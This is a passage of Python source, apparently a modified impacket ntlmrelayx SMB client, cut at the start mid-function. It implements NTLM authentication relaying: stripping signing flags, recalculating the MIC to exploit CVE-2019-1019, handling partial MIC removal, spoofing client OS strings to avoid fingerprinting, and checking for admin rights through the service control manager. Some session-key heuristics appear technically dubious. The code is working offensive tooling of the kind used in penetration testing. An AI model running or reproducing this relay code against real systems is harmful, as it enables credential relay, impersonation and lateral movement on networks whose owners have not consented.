                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
            # Keep SEAL flag for SMB->SMB (matches authentic local SYSTEM auth in PCAP)
            # if authMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
            #     authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
            # Do NOT remove KEY_EXCH or VERSION flags
            # Do NOT zero out MIC or Version fields - keep NTLM3 message intact

            LOG.debug('[SMB] sendAuth: Modified auth flags: 0x%x, MIC intact, SEAL kept' % authMessage['flags'])

            # Try to extract/derive session key for SMB operations
            # Log what we have to work with
            LOG.debug('[SMB] sendAuth: NTLMv2 response length: %d' % (len(authMessage['ntlm']) if authMessage['ntlm'] else 0))
            LOG.debug('[SMB] sendAuth: LM response length: %d' % (len(authMessage['lanman']) if authMessage['lanman'] else 0))
            LOG.debug('[SMB] sendAuth: Encrypted session key length: %d' % (len(authMessage['session_key']) if authMessage['session_key'] else 0))

            # Log AV_PAIRS if present in NTLMv2 response
            # NTLMv2 response format: HMAC(16 bytes) + blob (variable)
            # Blob format: signature(4) + reserved(4) + timestamp(8) + challenge(8) + reserved(4) + av_pairs + reserved(4)
            if authMessage['ntlm'] and len(authMessage['ntlm']) > 32:
                try:
                    from impacket.ntlm import AV_PAIRS
                    # Skip HMAC (16 bytes) + signature (4) + reserved (4) + timestamp (8) + challenge (8) + reserved (4) = 44 bytes
                    av_pairs_data = authMessage['ntlm'][44:]
                    # Find the end of AV_PAIRS (marked by type 0x0000)
                    av_pairs = AV_PAIRS(av_pairs_data)
                    LOG.debug('[SMB] sendAuth: AV_PAIRS found in NTLMv2 response:')
                    for key in av_pairs.fields:
                        LOG.debug('[SMB] sendAuth:   AV_PAIR type 0x%02x: %r' % (key, av_pairs[key]))
                except Exception as e:
                    LOG.debug('[SMB] sendAuth: Could not parse AV_PAIRS: %s' % str(e))
            else:
                LOG.debug('[SMB] sendAuth: NTLMv2 response too short or missing, no AV_PAIRS to parse')

            # For local SYSTEM auth, try using the encrypted session key directly if available
            # Otherwise we may need to derive it differently or accept we can't sign
            if authMessage['session_key'] and len(authMessage['session_key']) > 0:
                signingKey = authMessage['session_key']
                LOG.debug('[SMB] sendAuth: Using encrypted session key from NTLM message, length: %d' % len(signingKey))
            elif authMessage['ntlm'] and len(authMessage['ntlm']) >= 16:
                # Try using the first 16 bytes of the NTLMv2 response as session key
                # This is a heuristic for local auth scenarios
                signingKey = authMessage['ntlm'][:16]
                LOG.debug('[SMB] sendAuth: Attempting to use NTLMv2 response as session key, length: %d' % len(signingKey))
            else:
                LOG.debug('[SMB] sendAuth: No usable session key material found')
                signingKey = None

            authenticateMessageBlob = authMessage.getData()

        #if unpack('B', str(authenticateMessageBlob)[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
        #    # We need to unwrap SPNEGO and get the NTLMSSP
        #    respToken = SPNEGO_NegTokenResp(authenticateMessageBlob)
        #    authData = respToken['ResponseToken']
        #else:
        authData = authenticateMessageBlob
        LOG.debug('[SMB] sendAuth: authData prepared, length: %d' % len(authData))

        if not signingKey:
            signingKey = None
        if self.serverConfig.remove_target:
            LOG.debug('[SMB] sendAuth: Using --remove-target, calculating signing key')
            # Trying to exploit CVE-2019-1019
            # Discovery and Implementation by @simakov_marina and @YaronZi
            # respToken2 = SPNEGO_NegTokenResp(authData)
            authenticateMessageBlob = authData

            errorCode, signingKey = self.netlogonSessionKey(authData)

            # Recalculate MIC
            res = NTLMAuthChallengeResponse()
            res.fromString(authenticateMessageBlob)

            newAuthBlob = authenticateMessageBlob[0:0x48] + b'\x00'*16 + authenticateMessageBlob[0x58:]
            relay_MIC = hmac_md5(signingKey, self.negotiateMessage + self.challengeMessage + newAuthBlob)

            respToken2 = SPNEGO_NegTokenResp()
            respToken2['ResponseToken'] = authenticateMessageBlob[0:0x48] + relay_MIC + authenticateMessageBlob[0x58:]
            authData = authenticateMessageBlob[0:0x48] + relay_MIC + authenticateMessageBlob[0x58:]
            #authData = respToken2.getData()

        if self.session.getDialect() == SMB_DIALECT:
            LOG.debug('[SMB] sendAuth: Sending SMBv1 authentication')
            token, errorCode = self.sendAuthv1(authData, serverChallenge)
        else:
            LOG.debug('[SMB] sendAuth: Sending SMBv2/v3 authentication')
            token, errorCode = self.sendAuthv2(authData, serverChallenge)

        LOG.debug('[SMB] sendAuth: Authentication completed with error code: 0x%x' % errorCode)

        if signingKey:
            logging.info("Enabling session signing")
            self.session._SMBConnection.set_session_key(signingKey)
        else:
            LOG.debug('[SMB] sendAuth: No signing key available, session will operate without signing')
            # For --remove-mic-partial with empty session key, explicitly set empty key
            # This tells the SMB library not to attempt signing
            if self.serverConfig.remove_mic_partial:
                LOG.debug('[SMB] sendAuth: Setting empty session key for --remove-mic-partial mode')
                self.session._SMBConnection.set_session_key(b'')

        return token, errorCode

    def sendAuthv2(self, authenticateMessageBlob, serverChallenge=None):
        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            # We need to unwrap SPNEGO and get the NTLMSSP
            respToken = SPNEGO_NegTokenResp(authenticateMessageBlob)
            authData = respToken['ResponseToken']
        else:
            authData = authenticateMessageBlob

        v2client = self.session.getSMBServer()

        sessionSetup = SMB2SessionSetup()
        sessionSetup['Flags'] = 0

        packet = v2client.SMB_PACKET()
        packet['Command'] = SMB2_SESSION_SETUP
        packet['Data']    = sessionSetup

        # Reusing the previous structure
        sessionSetup['SecurityBufferLength'] = len(authData)
        sessionSetup['Buffer'] = authData

        packetID = v2client.sendSMB(packet)
        packet = v2client.recvSMB(packetID)

        return packet, packet['Status']

    def sendAuthv1(self, authenticateMessageBlob, serverChallenge=None):
        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            # We need to unwrap SPNEGO and get the NTLMSSP
            respToken = SPNEGO_NegTokenResp(authenticateMessageBlob)
            authData = respToken['ResponseToken']
        else:
            authData = authenticateMessageBlob

        v1client = self.session.getSMBServer()

        smb = NewSMBPacket()
        smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY | SMB.FLAGS2_UNICODE
        # Are we required to sign SMB? If so we do it, if not we skip it
        if v1client.is_signing_required():
           smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE
        smb['Uid'] = v1client.get_uid()

        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Extended_Data()

        sessionSetup['Parameters']['MaxBufferSize']        = 65535
        sessionSetup['Parameters']['MaxMpxCount']          = 2
        sessionSetup['Parameters']['VcNumber']             = 1
        sessionSetup['Parameters']['SessionKey']           = 0
        sessionSetup['Parameters']['Capabilities']         = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE

        # Fake Data here, don't want to get us fingerprinted
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        sessionSetup['Parameters']['SecurityBlobLength'] = len(authData)
        sessionSetup['Data']['SecurityBlob'] = authData
        smb.addCommand(sessionSetup)
        v1client.sendSMB(smb)

        smb = v1client.recvSMB()

        errorCode = smb['ErrorCode'] << 16
        errorCode += smb['_reserved'] << 8
        errorCode += smb['ErrorClass']

        return smb, errorCode

    def getStandardSecurityChallenge(self):
        if self.session.getDialect() == SMB_DIALECT:
            return self.session.getSMBServer().get_encryption_key()
        else:
            return None

    def isAdmin(self):
        rpctransport = SMBTransport(self.session.getRemoteHost(), 445, r'\svcctl', smb_connection=self.session)
        dce = rpctransport.get_dce_rpc()
        try:
            dce.connect()
        except:
            pass
        else:
            dce.bind(scmr.MSRPC_UUID_SCMR)
            try:
                # 0xF003F - SC_MANAGER_ALL_ACCESS
                # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
                ans = scmr.hROpenSCManagerW(dce,'{}\x00'.format(self.target.hostname),'ServicesActive\x00', 0xF003F)
                return "TRUE"
            except scmr.DCERPCException as e:
                pass
        return "FALSE"
